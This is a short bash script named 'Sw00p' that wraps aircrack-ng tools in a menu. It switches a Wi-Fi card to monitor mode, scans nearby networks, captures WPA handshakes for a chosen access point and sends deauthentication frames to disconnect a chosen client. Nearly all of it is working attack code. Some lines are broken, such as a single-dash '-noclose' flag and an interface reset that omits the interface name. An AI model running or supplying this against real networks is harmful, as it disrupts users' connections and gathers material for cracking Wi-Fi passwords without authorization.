#!/bin/bash


function menu
{
clear
echo -e "\e[31;1m#########################"
echo -e "\e[32;1m#        Sw00p          #"
echo -e "\e[30;1m#########################"
echo ""
echo -e "\e[31;1m[+]Choose an option..."
echo -e "\e[31;1m[1]\e[32;1mPut Card Into Monitor Mode"
echo -e "\e[31;1m[2]\e[32;1mRun Airodunp For Recon"
echo -e "\e[31;1m[3]\e[32;1mRun Airodump To Capture Handshake"
echo -e "\e[31;1m[4]\e[32;1mDeauth User"
echo -e "\e[31;1m[5]\e[32;1mReset WIFI Card"
echo -e "\e[31;1m[0]\e[32;1mQuit"
read Ops
}

clear
echo -e "\e[31;1m#########################"
echo -e "\e[32;1m#        Sw00p          #"
echo -e "\e[30;1m#########################"
echo ""
echo -e "\e[31;1m[+]\e[32;1mEnter Wifi Card Name..."
read WI
clear
menu

function MonM
{
clear
airmon-ng check kill
airmon-ng start $WI &
clear
sleep 1
menu
}

function Recon
{
clear
konsole --noclose -e airodump-ng $WI >/dev/null &
sleep 1
clear
menu
}

function Cap
{
clear
echo -e "\e[32;1m[+]Enter Channel..."
read CHAN
echo -e "\e[32;1m[+]Enter BSSID..."
read BID
mkdir Capture-$WI
konsole --noclose -e airodump-ng -c $CHAN --bssid $BID -w Capture-$WI/capture $WI &
sleep 1
clear
menu
}

function Deauth
{
clear
echo -e "\e[32;1m[+]Enter BSSID..."
read BID
echo -e "\e[32;1m[+]Enter Station..."
read STAT
konsole -noclose -e aireplay-ng -0 1 -a $BID -c $STAT $WI &
sleep 1
clear
menu
}

function Reset
{
clear
sudo systemctl stop NetworkManager
sudo ip link set $WI down
sudo iw $WI set type managed
sudo ip link set  up
sudo systemctl start NetworkManager
clear
menu
}


while [ 1 ]
do

case $Ops in
  0)
    clear
    break ;;
  1) 
    clear
    echo -e "\e[32;1m[+]Monitor Mode Coming Up!!"
    sleep 2
    MonM ;;
  2)
    clear
    echo -e "\e[32;1m[+]Remember To Close External Windows Before Reseting WIFI Card!!"
    sleep 2
    Recon ;;
  3)
    clear
    echo -e "\e[32;1m[+]Remember To Close External Windows Before Reseting WIFI Card!!"
    sleep 2
    Cap ;;
  4)
    clear
    echo -e "\e[32;1m[+]Remember To Close External Windows Before Reseting WIFI Card!!"
    sleep 2
    Deauth ;;
  5)
    Reset ;;
esac

done

